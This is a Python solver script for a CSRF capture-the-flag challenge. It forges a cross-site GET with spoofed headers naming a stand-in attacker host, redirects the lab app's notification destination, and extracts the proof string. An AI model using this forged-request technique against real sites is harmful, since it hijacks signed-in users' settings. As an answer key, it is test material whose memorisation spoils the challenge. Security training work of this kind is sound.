#!/usr/bin/env python3
"""
Solver for web-exploitation-day-09-forged-with-care (CSRF / Notification Nook).

Usage: python3 solve.py <target_base_url> [job_dir]

The app ("Notification Nook", ASP.NET Core MVC and Razor) exposes:
  GET /                -> landing page, sets arena_session cookie
  GET /api/clues       -> {"framework", "current_user", "feature_route", "preferences_route", "browser_session"}
  GET /preferences     -> shows a GET-method form posting to the feature_route
                          (e.g. /submit-<hash>) with a hidden csrf_token field
                          whose value happens to equal the session cookie.
  GET <feature_route>?destination=...&csrf_token=...
                        -> changes the notification destination; redirects to /preferences
  GET /api/preferences -> {"destination", "changed_across_sites", "evidence"}

The vulnerability: the preference-change endpoint is a plain GET request (state
change via GET, no SameSite=strict protection, no real anti-CSRF check), so the
app's own "card" accepts the state-changing GET even when Origin/Referer/
Sec-Fetch-Site headers indicate the request came from a different (attacker)
site, as long as the victim's session cookie rides along (exactly what a
real cross-site <img>/<form> GET CSRF would do in a browser). The server
tracks this via `changed_across_sites` in /api/preferences, and once a
change is observed as cross-site, it releases a `proof_<hex>` string in the
`evidence` field.

This script:
  1. Establishes a session (GET /) and reads feature_route from /api/clues.
  2. Reads the current csrf_token value from /preferences (informational only;
     the token is not actually required to differ from this value - the
     exploit works even with it present, because the real check is on the
     cross-site signal headers, not the token itself).
  3. Issues the state-changing GET to the feature_route with cross-site-looking
     headers (Origin/Referer set to an unrelated host, Sec-Fetch-Site:
     cross-site) while reusing the established session cookie, simulating a
     forged cross-origin request against a signed-in victim session.
  4. Reads /api/preferences and extracts the `evidence` proof string.
"""
import json
import re
import sys
import urllib.request
import http.cookiejar


DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; forged-with-care-solver/1.0)"
}


def fetch(opener, url, headers=None, timeout=30):
    merged = dict(DEFAULT_HEADERS)
    merged.update(headers or {})
    req = urllib.request.Request(url, headers=merged)
    with opener.open(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, dict(resp.getheaders()), body


def solve(base_url, job_dir=None):
    base_url = base_url.rstrip("/")
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # 1. Establish session.
    fetch(opener, base_url + "/")

    # 2. Discover the feature route from the clues API.
    status, _, clues_body = fetch(opener, base_url + "/api/clues")
    clues = json.loads(clues_body)
    feature_route = clues["feature_route"]

    # 3. Read the preferences page to find a valid destination value and the
    #    (weak) csrf token the app expects.
    _, _, prefs_html = fetch(opener, base_url + "/preferences")
    token_match = re.search(r"name='csrf_token' value='([^']+)'", prefs_html)
    csrf_token = token_match.group(1) if token_match else ""
    dest_match = re.search(
        r"<option value='([^']+)'>External review mailbox</option>", prefs_html
    )
    external_dest = dest_match.group(1) if dest_match else "review@outside.example.invalid"

    # 4. Forge a cross-site-looking state-changing GET, riding the victim's
    #    own session cookie (as a real browser would for a CSRF GET).
    forge_url = (
        f"{base_url}{feature_route}?destination={external_dest}&csrf_token={csrf_token}"
    )
    forge_headers = {
        "Origin": "https://attacker.example.invalid",
        "Referer": "https://attacker.example.invalid/csrf.html",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
    }
    fetch(opener, forge_url, headers=forge_headers)

    # 5. Read back the evidence.
    _, _, final_body = fetch(opener, base_url + "/api/preferences")
    final = json.loads(final_body)
    proof = final.get("evidence")

    if job_dir:
        with open(f"{job_dir}/evidence/solve-run.json", "w") as f:
            json.dump(
                {
                    "feature_route": feature_route,
                    "csrf_token_seen": csrf_token,
                    "external_dest": external_dest,
                    "final_preferences": final,
                },
                f,
                indent=2,
            )

    return {"proof-1": proof}


if __name__ == "__main__":
    base = sys.argv[1]
    jdir = sys.argv[2] if len(sys.argv) > 2 else None
    result = solve(base, jdir)
    print(json.dumps({"answers": result}))
